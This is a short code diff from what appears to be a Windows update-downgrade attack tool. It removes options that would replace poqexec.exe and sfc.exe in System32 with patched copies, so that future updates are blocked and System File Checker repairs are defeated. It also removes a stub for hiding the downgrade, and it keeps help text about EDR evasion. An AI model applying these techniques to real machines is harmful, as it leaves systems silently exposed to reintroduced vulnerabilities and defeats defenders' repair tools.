@@ -185,15 +185,6 @@ def parse_args() -> argparse.Namespace:
                         help="Flag specifying whether to elevate to TrustedInstaller. "
                              "Functionality is the same, but smoother with TrustedInstaller. "
                              "Not recommended if facing an EDR!")
-    parser.add_argument("--invisible", action="store_true",
-                        help="Flag specifying whether to make the downgrade invisible by installing missing updates. "
-                             "If not used, and the system has missing updates, the system may not be fully up to date.")
-    parser.add_argument("--persistent", action="store_true",
-                        help="Flag specifying whether to employ downgrade persistence by emptying future updates. "
-                             "If not used, future updates may overwrite the downgrade.")
-    parser.add_argument("--irreversible", action="store_true",
-                        help="Flag specifying whether to make the downgrade irreversible. "
-                             "If not used, repairing tools such as SFC may be able to detect and repair the downgrade.")
 
     return parser.parse_args()
 
@@ -315,25 +306,6 @@ def main() -> None:
 
     update_files = parse_config_xml(args.config_xml)
     logger.info("Parsed config file")
-
-    if args.invisible:
-        raise NotImplementedError("Not implemented yet")
-
-    # TODO: Verify the patched file exists, else we just get its base
-    if args.persistent:
-        patched_poqexec_path = f"{cwd}\\resources\\PoqExec\\poqexec.exe"
-        poqexec_path = "C:\\Windows\\System32\\poqexec.exe"
-        poqexec_update_file_obj = UpdateFile(patched_poqexec_path, poqexec_path)
-        update_files.append(poqexec_update_file_obj)
-        logger.info("Added patched PoqExec to update files for persistence")
-
-    # TODO: Verify the patched file exists, else we just get its base
-    if args.irreversible:
-        patched_sfc_path = f"{cwd}\\resources\\SFC\\sfc.exe"
-        sfc_path = "C:\\Windows\\System32\\sfc.exe"
-        sfc_update_file_obj = UpdateFile(patched_sfc_path, sfc_path)
-        update_files.append(sfc_update_file_obj)
-        logger.info("Added patched SFC to update files for irreversible")
 
     retrieve_oldest_files_for_update_files(update_files)
 
